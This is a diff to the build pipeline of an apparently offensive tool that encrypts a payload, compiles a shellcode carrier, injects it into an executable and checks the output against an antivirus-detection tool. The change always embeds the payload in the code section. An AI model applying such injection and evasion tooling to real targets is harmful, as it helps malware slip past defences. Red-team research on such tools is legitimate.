@@ -167,14 +167,12 @@ def start_real(settings: Settings):
     # CREATE: Carrier C source files from template (C->C)
     phases.templater.create_c_from_template(settings, len(project.payload.payload_data))
 
-    # If we put the payload into .rdata
     # PREPARE DataReuseEntry for usage in Compiler/AsmTextParser
-    if settings.payload_location == PayloadLocation.DATA:
-        logger.info("--[ Load payload for use in .rdata injection")
-        project.carrier.add_datareuse_fixup(DataReuseEntry("supermega_payload"))
-        entry = project.carrier.get_reusedata_fixup("supermega_payload")
-        entry.data = phases.assembler.encode_payload(
-            project.payload.payload_data, settings.decoder_style)  # encrypt
+    # So the carrier is able to find the payload
+    project.carrier.add_datareuse_fixup(DataReuseEntry("supermega_payload", in_code=True))
+    entry = project.carrier.get_reusedata_fixup("supermega_payload")
+    entry.data = phases.assembler.encode_payload(
+        project.payload.payload_data, settings.decoder_style)  # encrypt
     observer.add_code_file("payload", project.payload.payload_data)
 
     # COMPILE: Carrier to .asm (C -> ASM)
@@ -201,21 +199,8 @@ def start_real(settings: Settings):
             build_exe = settings.main_exe_path)
         observer.add_code_file("carrier_shc", carrier_shellcode)
 
-    # MERGE: shellcode/loader with payload (SHC + PAYLOAD -> SHC)
-    if settings.payload_location == PayloadLocation.CODE:
-        logger.info("--[ Merge carrier with payload for .text injection".format())
-        full_shellcode = phases.assembler.merge_loader_payload(
-            shellcode_in = carrier_shellcode,
-            payload_data = project.payload.payload_data, 
-            decoder_style = settings.decoder_style)
-        #observer.add_code_file("full_shc", full_shellcode)
-    else:
-        # shellcode is in .rdata, so we dont need to merge
-        # Encoding is handled before this
-        full_shellcode = carrier_shellcode
-
     # inject (merged) loader into an exe. Big task.
-    phases.injector.inject_exe(full_shellcode, settings, project.carrier, project.payload)
+    phases.injector.inject_exe(carrier_shellcode, settings, project.carrier, project.payload)
     #observer.add_code_file("exe_final", extract_code_from_exe_file_ep(settings.inject_exe_out, 300))
 
     # Check binary with avred
